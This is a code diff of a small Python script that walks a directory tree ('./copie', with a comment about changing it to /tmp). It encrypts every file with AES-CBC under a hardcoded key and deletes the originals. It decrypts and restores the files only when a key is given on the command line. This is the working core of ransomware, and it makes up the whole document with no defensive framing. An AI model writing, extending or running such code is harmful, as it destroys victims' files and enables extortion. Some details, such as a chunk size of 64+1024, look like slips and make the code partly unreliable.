@@ -3,11 +3,7 @@ from Crypto import Random
 import os
 import random
 import struct
-
-
-# a changer en /tmp
-baseUrl = './copie'
-key = b"3CC5DBACEFB9D865"
+import sys
 
 
 def encryptFile(key, filename, out_filename=None, chunksize=64+1024):
@@ -15,7 +11,6 @@ def encryptFile(key, filename, out_filename=None, chunksize=64+1024):
     if not out_filename:
         out_filename = filename + '.enc'
 
-    # iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
     iv = Random.new().read(AES.block_size)
 
     encryptor = AES.new(key, AES.MODE_CBC, iv)
@@ -56,20 +51,37 @@ def decryptFile(key, filename, out_filename=None, chunksize=24*1024):
             outfile.truncate(origsize)
 
 
+def main(argv):
 
-for root, dirs, files in os.walk(baseUrl, topdown=False):
-   for name in files:
-        file = os.path.join(root, name)
-        print(file)
-        # encrypt
-        '''
-        if file[-4:] != ".enc":
-            print("[*] Encrypting... ")
-            encryptFile(key, file)
-        '''
+    # a changer en /tmp
+    baseUrl = './copie'
+    key = b"3CC5DBACEFB9D865"
 
-        # decrypt
-        if file[-4:] == ".enc":
-            print("[*] Decrypting... ")
-            decryptFile(key, file)
-        
+    is_decrypt = None
+
+    if len(argv) > 1:
+        is_decrypt = True
+        key = argv[1]
+
+
+    for root, dirs, files in os.walk(baseUrl, topdown=False):
+       for name in files:
+            file = os.path.join(root, name)
+            print(file)
+
+            # decrypt
+            if is_decrypt:
+                if file[-4:] == ".enc":
+                    print("[*] Decrypting... ")
+                    decryptFile(key, file)
+                    os.remove(file)
+            # encrypt
+            else:
+                if file[-4:] != ".enc":
+                    print("[*] Encrypting... ")
+                    encryptFile(key, file)
+                    os.remove(file)
+
+
+if __name__ == '__main__':
+    main(sys.argv)
